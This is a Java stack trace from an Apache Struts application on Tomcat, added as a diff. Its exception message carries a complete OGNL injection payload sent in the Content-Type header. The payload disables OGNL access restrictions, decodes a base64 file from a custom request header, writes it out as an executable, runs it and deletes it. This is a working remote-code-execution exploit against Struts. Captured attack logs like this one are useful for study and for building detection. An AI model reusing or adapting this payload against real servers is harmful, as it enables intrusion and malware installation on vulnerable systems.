+org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException: the request doesn't contain a multipart/form-data or multipart/form-data stream, content type header is %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('X-BQuA')).(#f=@java.io.File@createTempFile('QtTK','.exe')).(#f.setExecutable(true)).(#f.deleteOnExit()).(#fos=new java.io.FileOutputStream(#f)).(#d=new sun.misc.BASE64Decoder().decodeBuffer(#data)).(#fos.write(#d)).(#fos.close()).(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).(#p.start()).(#f.delete())}
+	at org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl.<init>(FileUploadBase.java:947)
+	at org.apache.commons.fileupload.FileUploadBase.getItemIterator(FileUploadBase.java:310)
+	at org.apache.commons.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:334)
+	at org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parseRequest(JakartaMultiPartRequest.java:189)
+	at org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.processUpload(JakartaMultiPartRequest.java:127)
+	at org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse(JakartaMultiPartRequest.java:92)
+	at org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper.<init>(MultiPartRequestWrapper.java:81)
+	at org.apache.struts2.dispatcher.Dispatcher.wrapRequest(Dispatcher.java:796)
+	at org.apache.struts2.dispatcher.ng.PrepareOperations.wrapRequest(PrepareOperations.java:134)
+	at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareFilter.doFilter(StrutsPrepareFilter.java:88)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:475)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:80)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:651)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:498)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
